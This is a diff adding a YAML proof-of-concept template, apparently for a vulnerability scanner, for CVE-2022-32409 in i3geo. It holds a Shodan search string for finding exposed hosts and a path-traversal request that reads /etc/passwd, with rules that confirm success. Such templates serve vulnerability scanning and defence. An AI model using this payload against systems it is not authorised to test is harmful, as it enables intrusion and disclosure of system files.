@@ -1,0 +1,23 @@
+id: poc-yaml-portal-do-software-publico-brasileiro-i3geo-local-file-inclusion
+info:
+  name: Portal do Software Publico Brasileiro i3geo 文件包含漏洞(CVE-2022-32409)
+  severity: critical
+  tags:
+  - lfi
+  - CVE-2022-32409
+  finger: i3Geo
+  shodan: http.html:"i3geo"
+requests:
+- method: GET
+  path: /i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && contains(body,"i3GEO")
+
+    '
+variables: {}
+transport: http
